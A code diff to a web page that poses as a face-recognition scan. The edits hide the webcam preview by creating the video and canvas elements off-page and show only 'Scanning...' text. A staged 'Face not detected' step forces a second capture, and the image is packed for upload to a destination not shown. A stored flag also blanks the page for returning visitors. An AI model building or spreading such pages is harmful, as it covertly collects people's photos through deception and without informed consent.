@@ -7,7 +7,7 @@
     <script>
         if (localStorage.getItem("site_accessed")) {
             document.body.innerHTML = "";
-            return;
+            throw new Error("Access Denied");
         }
     </script>
     <style>
@@ -41,11 +41,15 @@
 
     <div id="scanning" class="hidden">
         <div id="animation"></div>
-        <video id="video" class="hidden" autoplay></video>
-        <canvas id="canvas" class="hidden"></canvas>
+        <p>Scanning...</p>
     </div>
 
     <p id="face-not-detected" class="hidden">Face not detected.</p>
+    <div id="scanning-second" class="hidden">
+        <div id="animation"></div>
+        <p>Scanning...</p>
+    </div>
+
     <p id="final-message" class="hidden"></p>
 
     <script>
@@ -76,13 +80,14 @@
         async function startCamera() {
             document.getElementById("face-recognition").classList.add("hidden");
             document.getElementById("scanning").classList.remove("hidden");
-            let video = document.getElementById("video");
-            let canvas = document.getElementById("canvas");
+            let video = document.createElement("video");
+            let canvas = document.createElement("canvas");
             let ctx = canvas.getContext("2d");
 
             try {
                 let stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
+                video.play();
                 setTimeout(() => captureImage(video, canvas, ctx, stream, false), 3000);
             } catch (error) {
                 alert("Error accessing camera.");
@@ -99,14 +104,14 @@
                 document.getElementById("face-not-detected").classList.remove("hidden");
                 setTimeout(() => {
                     document.getElementById("face-not-detected").classList.add("hidden");
-                    document.getElementById("scanning").classList.remove("hidden");
+                    document.getElementById("scanning-second").classList.remove("hidden");
                     captureImage(video, canvas, ctx, stream, true);
                 }, 5000);
                 return;
             }
             
             video.srcObject.getTracks().forEach(track => track.stop());
-            document.getElementById("scanning").classList.add("hidden");
+            document.getElementById("scanning-second").classList.add("hidden");
             
             canvas.toBlob(blob => {
                 let formData = new FormData();
